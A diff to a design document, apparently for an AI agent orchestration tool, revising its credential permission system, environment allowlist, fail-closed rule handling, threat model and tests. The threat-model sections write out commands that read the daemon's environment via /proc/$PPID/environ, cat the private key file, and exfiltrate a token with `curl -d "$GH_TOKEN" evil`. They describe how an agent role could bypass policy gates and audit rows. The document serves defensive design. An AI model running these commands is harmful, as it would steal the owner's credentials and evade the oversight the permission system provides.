@@ -162,7 +162,7 @@ CREATE TABLE IF NOT EXISTS permission_policies (
     matcher TEXT,                       -- JSON, command rules only (section 8)
     source TEXT NOT NULL,               -- owner | agent_proposed | default
     status TEXT NOT NULL,               -- active | proposed | retired; only 'active' rules
-                                        -- are ever evaluated
+                                        -- are evaluated; any other value is malformed (section 6)
     note TEXT NOT NULL DEFAULT '',
     created_at DOUBLE PRECISION NOT NULL,
     updated_at DOUBLE PRECISION NOT NULL
@@ -445,7 +445,8 @@ Today `role_env` starts from `env = dict(os.environ)` (`nodes/tools.py:308`) and
 (`nodes/tools.py:208-215`) that all four `LocalExecutor` construction sites reach
 (`nodes/tools.py:101`, `nodes/git_ops.py:243`, `roles/builtin/auditor.py:117`,
 `roles/builtin/investigator.py:110`). The owner's requirement is that this channel is
-closed, so the environment a role command receives is *built*, not filtered:
+closed (the child's own inherited environment; the daemon's launch environment is a
+separate path, point d), so the environment a role command receives is *built*, not filtered:
 
 - **(a) Baseline allowlist, everything else dropped.** `role_env` starts from an empty
   dict and copies a variable from the daemon's environment only if its name is on the
@@ -516,13 +517,28 @@ closed, so the environment a role command receives is *built*, not filtered:
   `tests/unit/test_nodes.py` finds `setenv` in only those two tests (`:344-346`, `:364`); the
   `delenv` calls at `:542` and `:639` only remove variables and are unaffected. Phase 1 runs
   the whole suite to find any other test that relies on an inherited variable.
-- **(d) This closes the ENVIRONMENT channel only, not the FILE channel.** A role still
-  runs as the daemon's OS user. The private key file (section 3), the default database
-  path (`config.py:68-69`, `:91`), `~/.rework/rework.env` (which holds provider keys),
-  `~/.rework/role_env.toml` itself, and any token a tool keeps on disk under `HOME` (for
-  example `gh`'s own login, or private keys in `~/.ssh`) stay readable to a role. That is the
-  section 11 "does not protect" story, unchanged; nothing in this subsection contradicts it, and it must not be
-  read as "roles can no longer reach secrets".
+- **(d) This closes the role command's own inherited ENVIRONMENT only, not the FILE
+  channel.** A role still runs as the daemon's OS user. The private key file (section 3),
+  the default database path (`config.py:68-69`, `:91`), `~/.rework/rework.env` (which holds
+  provider keys), `~/.rework/role_env.toml` itself, and any token a tool keeps on disk under
+  `HOME` (for example `gh`'s own login, or private keys in `~/.ssh`) stay readable to a role.
+  So does **the daemon's own launch environment, through `/proc/<daemon pid>/environ` and
+  `ps eww`**: a role's shell is a child of the daemon (`create_subprocess_shell`,
+  `nodes/tools.py:208`) running as the same OS user, so `$PPID` is the daemon's pid and
+  `tr '\0' '\n' </proc/$PPID/environ` (or `ps eww -p $PPID`) prints the environment the
+  daemon was *started* with: a systemd unit's `Environment=` lines and `EnvironmentFile=`
+  entries (the `rework.env` convention, `config.py:21-24`), shell exports such as
+  `REWORK_DB` and provider keys. The allowlist does nothing about this, because it filters
+  what the *child* receives, not what the same user can read of the *parent*. One
+  qualification: keys that `load_env_file` adds to `os.environ` after the daemon has
+  started (`config.py:20-46`) generally do not appear in `/proc/<pid>/environ`, which shows
+  the initial environment block, but they do sit in `rework.env`, which is already listed
+  above. **Only a separate OS user for the daemon or the Docker executor (M7) closes
+  these channels.** That is the section 11 "does not protect" story, unchanged; nothing in
+  this subsection contradicts it, and it must not be read as "roles can no longer reach
+  secrets". The named `printenv` tests (point g) exercise the child's environment only and
+  would pass while `/proc/<daemon pid>/environ` stays open; they are not evidence that
+  this path is closed.
 - **(e) Provider keys stay with the providers (section 10).** The allowlist removes them
   from the role environment; it does not move them into the Library, encrypt them or put
   them behind the permission system. The redactor's redact-only needles for them
@@ -534,8 +550,11 @@ closed, so the environment a role command receives is *built*, not filtered:
   git calls, which use `create_subprocess_exec` with no `env=` (`git_ops._run`,
   `nodes/git_ops.py:15-28`, so `push_branch` and `clone_origin` still see the daemon's
   `SSH_AUTH_SOCK` and git config). Only the `LocalExecutor` spawn is allowlisted
-  (`git_ops.worktree_executor`, `:243`, is the coder's executor, not the engine's git). The
-  engine's own PR creation and pushes are therefore unaffected.
+  (`git_ops.worktree_executor`, `nodes/git_ops.py:243`, is a `LocalExecutor` construction
+  site, so it is covered, but it has no other caller in `src/rework`: the coder's executor is
+  the `LazyExecutor`, `nodes/tools.py:101`, which builds a `LocalExecutor` in `attach`; and
+  it is not the engine's git either). The engine's own PR creation and pushes are therefore
+  unaffected.
   For role commands:
   - **An exported `GH_TOKEN` (or `GITHUB_TOKEN`) stops reaching a role's `gh`** until it is
     registered as a credential with that `env_name` and an allow rule. A `gh` that is
@@ -733,7 +752,9 @@ recognises values rework holds and shapes the detector knows (the limits above).
   value for it (`None`; the MCP server, below); only `"*"` does.
 - **Malformed rules fail closed, in the direction that denies.** A rule is malformed when
   a scope key is missing or unknown, the JSON of `scope` or `matcher` does not parse,
-  `subject_id` is NULL, or the combination is invalid (for example `effect=allow` on a
+  `subject_id` is NULL, `status` is not in {`active`, `proposed`, `retired`} (a hand edit to
+  `'Active'` or a typo would otherwise skip the rule silently, `git push --force` included),
+  or the combination is invalid (for example `effect=allow` on a
   command rule). Saving one is rejected. If one is found in the table, what "closed" means
   depends on the subject, because the two defaults differ (next subsection):
   - **Credential, skill and tool subjects (default deny).** A malformed `allow`/`ask` rule
@@ -751,7 +772,20 @@ recognises values rework holds and shapes the detector knows (the limits above).
     purpose: it stays noisy until the owner repairs it with `rework permissions list
     --malformed` then `edit` or `retire`, or `rework permissions reset-defaults --repair`
     (which replaces a malformed `source='default'` row from the shipped seed).
-  Only `status='active'` rows are evaluated; `proposed` and `retired` rows never match.
+  Only `status='active'` rows are evaluated; `proposed` and `retired` rows never match. A
+  row whose `status` is none of the three is not "retired by accident": it is malformed and
+  resolves by the two bullets above (for a command rule, a hit), so a mis-cased status can
+  never turn a rule off.
+
+  **The two failure modes, stated once.** They differ and both fail closed. (1) A command
+  rule that *can be read as a command rule* but is malformed (corrupt `matcher` JSON, a bad
+  `status`, a bad scope) is a **hit of its own class**: an `ask` rule is an ask-class hit
+  (one gate naming the rule, `rule <id> is malformed`), a `deny` rule a deny-class hit, and
+  an unreadable `effect` is deny-class; the call is gated or refused, and the rest of the
+  rule set is still evaluated. (2) A row or a read the loader **cannot classify at all**
+  (a database error, an unknown rule shape) makes the command policy unreadable and
+  **denies the whole call**, a plain `ls` included (step 5 below). Neither is ever a
+  skipped rule.
 
 **Two kinds of subject, two defaults.** This resolves the apparent conflict between "no
 matching rule means deny" and "an ordinary command is not asked about":
@@ -792,7 +826,7 @@ evaluation *of that subject*:
 5. **Command policy** (section 8; phase 2, there are no command rules in phase 1): for
    every `run_command`, with or without credentials,
    match the command against active `command` rules. `deny`: deny. `ask`: ask. A malformed
-   rule is a hit of its own class (above). No match, **after a successful read of the
+   rule (including a bad `status`) is a hit of its own class (above). No match, **after a successful read of the
    rules**: no restriction from this step (allowed). An error reading the command rules
    (database error, unknown rule shape the loader cannot classify) **denies the call**
    (`denied: command policy unreadable`), including a plain `ls`. There is no cached
@@ -832,7 +866,7 @@ instead of the body; `library_search` / `search` and the spawn menu
   is denied or times out, or on `unavailable`, returns `denied: <reason>` **without
   delegating inward**: the body is not read and `record_use` is not called. An allowed
   read delegates unchanged. For credentials `library_read` returns the metadata page only
-  (section 2), never a value, so it is never denied; a credential's use is the
+  (section 4, step 1), never a value, so it is never denied; a credential's use is the
   `run_command` path.
 - **The MCP server's `get`** (`library/mcp.py:45-55`). It runs as `rework library-mcp`
   for an external harness over stdio: no role, run or mission, and no executor, so
@@ -936,7 +970,10 @@ model can click through is not a stop. Anyone who can write the `gates` table ca
 flip a decision; that is the DB-writer row of section 11.
 
 **Timeout and denial.** The deadline is `gate.created_at + REWORK_PERMISSION_TIMEOUT_S`
-(default 1800), derived from the row, not process uptime (CLAUDE.md hard rule 5). On
+(default 1800), derived from the row, not process uptime, in the spirit of CLAUDE.md hard rule 5 (which
+puts wait deadlines in graph state; this one lives in the gate row because the wrapper
+blocks inside a tool call rather than at an `interrupt()`, and the row is the source of
+truth, hard rule 3). On
 timeout the wrapper records `decision_note="timed out"`, status denied, and returns
 `denied: permission gate timed out; the command was not run`. On deny it returns
 `denied: <note>`; on run abort (the run row no longer running) it returns the same stop
@@ -1114,14 +1151,14 @@ around the sanctioned path is in the second table, first.
 | values in logs, events, artifacts, reports, PR bodies, transcripts that rework's own processes write on the daemon host | redaction at the choke points in section 5 (by value there; shape rules only off-host, section 5) |
 | a value reaching the mirrored library repo through `contribute` | credentials skip `write_body`; `contribute` redacts everything else |
 | an agent that uses the **sanctioned path** (`run_command credentials=[...]`) outside its scope or without approval | the engine evaluates policy, opens gates and writes audit rows on that path, failing closed. It does not stop an agent that bypasses the path (first row below) |
-| a role command reading the daemon's **environment** (`printenv`, `echo $REWORK_ANTHROPIC_KEY`, `$REWORK_DB` with its password, an exported token) | `role_env` is an allowlist and drops everything else (section 4, phase 1; named test `test_role_command_cannot_see_provider_keys_or_db`). Environment channel only: the file channel is the first row below |
+| a role command reading **its own inherited environment** (`printenv`, `echo $REWORK_ANTHROPIC_KEY`, `$REWORK_DB` with its password, an exported token) | `role_env` is an allowlist and drops everything else (section 4, phase 1; named test `test_role_command_cannot_see_provider_keys_or_db`). It does **not** cover the daemon's *launch* environment, which a role can read from `/proc/<daemon pid>/environ` or `ps eww`, nor any file: both are the first row below |
 | an accidental destructive command | the command policy asks (a speed bump, section 8) |
 | a *forgotten* sanctioned use | every sanctioned use has an audit row; audit failure denies |
 | accidental corruption, or an envelope copied between credential rows | AEAD with the item id in the AAD turns it into `unavailable: corrupt`, never another credential's value. It is **not** a defence against a deliberate DB writer (below) |
 
 | does **not** protect against | why |
 |---|---|
-| **any role, today, bypassing the whole system by reading the key and the database** | roles run as the daemon's OS user under an advisory jail (`nodes/tools.py:131-134`). The phase-1 allowlist (section 4) closes the **environment** channel; the **file** channel stays open. One `run_command` can `cat ~/.rework/keys/credentials.key`, find the DB (the default sqlite path, `config.py:68-69`, `:91`, or a Postgres URL kept in a file such as `~/.rework/rework.env`) and decrypt every credential: no policy check, no gate, no audit row. The same channel exposes any token a tool keeps on disk under `HOME` (`gh`'s own login, `~/.ssh` keys). The scratch redirects in `role_env` (`:319-323`) hide nothing on disk. **Until a Docker executor (M7) or a separate OS user owns the key, the permission system governs well-behaved agents and mistakes, not a hostile or manipulated role.** An advisory deny rule on the key path (section 3) is a speed bump only |
+| **any role, today, bypassing the whole system by reading the key and the database** | roles run as the daemon's OS user under an advisory jail (`nodes/tools.py:131-134`). The phase-1 allowlist (section 4) closes only the role command's own inherited **environment**; the **file** channel and the daemon's launch environment stay open. A role's shell is a child of the daemon, so `$PPID` is the daemon's pid and `tr '\0' '\n' </proc/$PPID/environ` (or `ps eww -p $PPID`) prints the daemon's launch environment (systemd `Environment=` / `EnvironmentFile=` entries, shell exports such as `REWORK_DB` and provider keys); keys added later by `load_env_file` are generally not in `/proc` environ but are in `rework.env`, below. One `run_command` can `cat ~/.rework/keys/credentials.key`, find the DB (the default sqlite path, `config.py:68-69`, `:91`, or a Postgres URL kept in a file such as `~/.rework/rework.env`) and decrypt every credential: no policy check, no gate, no audit row. The same channel exposes any token a tool keeps on disk under `HOME` (`gh`'s own login, `~/.ssh` keys). The scratch redirects in `role_env` (`:319-323`) hide nothing on disk. **Only a separate OS user or the Docker executor (M7) closes these channels. Until then the permission system governs well-behaved agents and mistakes, not a hostile or manipulated role.** An advisory deny rule on the key path (section 3) is a speed bump only |
 | **anyone who can write the database** (the daemon's own DB credentials, a role that finds them, a compromised TUI machine with store access, a `pg_dump` restore into the live DB) | they can insert or edit `permission_policies` (grant themselves allow/`never`), insert `permission_grants`, flip a gate decision (`gates` is just a table; `tui/data.py:302` is a plain `store.decide_gate`), edit or delete `permission_audit` rows (append-only is a property of the store *interface*, not a database constraint), replace the active public key, and, because the public key is public and ECIES has no sender authentication, write a valid envelope of their own value into any credential (so `github-token` can silently become the attacker's token). They cannot read existing values without the private key. The TUI's fingerprint pin catches a public-key swap only on a machine that pinned it; `rotated_at`/`updated_by` make an unexpected rotation *visible* to an owner who looks, not impossible; owner-signed envelopes and DB-level append-only triggers are possible hardening and are not designed here |
 | a compromised rewvis host or a root user there | the private key and the decrypted values are in reach |
 | an agent exfiltrating a value through a command it is allowed to run (`curl -d "$GH_TOKEN" evil`, `printenv > file`) | the command has the plaintext; `every_use` shows the owner the exact command, and the pre-push scan (phase 2) catches committed files on the two engine push paths only (section 5), but policy cannot read intent |
@@ -1240,7 +1277,9 @@ Tests (SQLite and Postgres via the store conformance suite):
   - `test_role_command_cannot_see_provider_keys_or_db`: through the real
     `PermissionExecutor` over a real `LocalExecutor` (a repo with a `pyproject.toml` and a
     plain repo, because they take different branches in `role_env`), set
-    `REWORK_ANTHROPIC_KEY`, `REWORK_FIREWORKS_KEY`, `REWORK_DB=postgresql://u:pw@h/db`,
+    `REWORK_ANTHROPIC_KEY`, `REWORK_FIREWORKS_KEY`, `ANTHROPIC_API_KEY` and `OPENAI_API_KEY`
+    (the defaults the provider adapters read when an entry names no `api_key_env`,
+    `kernel/llm/adapters/__init__.py:39-42`), `REWORK_DB=postgresql://u:pw@h/db`,
     `REWORK_TOKEN`, `GH_TOKEN` and an arbitrary `FOO_SECRET` in the daemon's environment;
     the role's `run_command` of `printenv` returns none of those names and none of those
     values, and still returns `PATH` and `HOME` (the test is not vacuous: the command ran).
@@ -1285,7 +1324,9 @@ the environment or from gh's own config under `HOME`); (2) after updating, a rol
 `printenv` shows no `REWORK_*_KEY` and no `REWORK_DB`, `rework role-env show`, run in the environment the daemon was started from (or the daemon's
 start-up log line), lists `GH_TOKEN` among the dropped names if it was exported, and a role's `gh pr list` *without*
 credentials now fails if the token came only from `GH_TOKEN` (that failure is the expected
-result and the owner's confirmation that the channel is closed); (3) the owner adds the
+result and the owner's confirmation that the inherited-environment channel is closed, not the file channel or `/proc/<daemon pid>/environ`); (3) first, on **every machine** (the daemon host, the Mac, any `--target`), `rework update`
+has shipped the tolerant `_row_to_item` and `rework keys init` has been run on the daemon
+host (section 12: no credential is created until both are done); then the owner adds the
 token with the CLI command above, a coder's `gh pr list` succeeds with
 `credentials=['github-token']`, and the very next call without it fails again; (4) if `gh`
 is logged in through its own config file instead, step 3 would prove nothing (HOME is
@@ -1300,7 +1341,11 @@ Lands: `permission_grants`; steps 4-5 and the combining rule of section 6 (`ask`
 replay safety, timeout and the `actor` tripwire; `credential_propose` (agent proposes name,
 description and policy; owner confirms through the gate on the existing Allow / Deny
 screen; owner then enters the value with `rework credential rotate NAME`, the masked TUI
-field being phase 3); the CLI `rework permissions edit|reset-defaults [--repair]` and
+field being phase 3); the CLI `rework permissions edit|reset-defaults [--repair]`, and the
+way the owner first creates an `every_use` (or `first_use_per_mission`) rule: an
+`--approval never|first_use_per_mission|every_use` option on `rework credential add` and
+`rework permissions allow` (phase 1 accepts only `never`), or, for a rule that already
+exists, `rework permissions edit RULE_ID --approval every_use`; and
 `list --commands` (`retire` and `list --malformed` already exist from phase 1);
 the command policy with parsing, defaults seeding, ambiguity rule, editing via CLI; the
 pre-push scan on both engine push paths.
@@ -1320,6 +1365,10 @@ Fail-closed command policy (section 6, step 5): `test_malformed_command_ask_rule
 (the seeded `git push --force` rule with a corrupt matcher: an unrelated `ls` opens a
 gate naming the malformed rule, and nothing runs before the decision),
 `test_malformed_command_deny_rule_denies`,
+`test_command_rule_with_bad_status_is_a_hit_not_skipped` (the seeded `git push --force`
+`ask` rule edited to `status='Active'`, then to a typo such as `'activ'`: each time
+`git push --force` opens a gate naming the malformed rule, and an unrelated `ls` is not
+silently allowed past it; an `status='retired'` rule still never matches),
 `test_command_rule_read_error_denies_even_a_plain_ls` (a store that raises on the command
 rule query: `denied: command policy unreadable`, no process spawned, no cached rules
 used), `test_empty_command_rules_after_successful_read_allows` (the contrast),
@@ -1425,8 +1474,11 @@ Postgres (`REWORK_TEST_POSTGRES`), ADR status moved to Accepted with amendments.
   anything that relied on an inherited variable (an exported `GH_TOKEN`, proxy variables,
   `SSH_AUTH_SOCK`, `REWORK_TEST_POSTGRES`, the `rework` CLI's `REWORK_DB`/`REWORK_TOKEN`);
   the owner moves each into a credential or `role_env.toml` (section 4, point f). In
-  exchange the environment channel is closed by construction, not by redaction.
-- Closing the environment channel does not close the file channel (section 11).
+  exchange a role command's own inherited environment is empty of secrets by construction,
+  not by redaction.
+- That does not close the file channel, nor the daemon's launch environment, which a role
+  can still read through `/proc/<daemon pid>/environ` or `ps eww` (section 4 point d,
+  section 11). Only a separate OS user or the Docker executor closes them.
 - A denied or timed-out permission gate asks again on a retry; the owner's standing no is
   a `deny` rule.
 - The advisory jail is still advisory. Real isolation remains the Docker executor (M7).
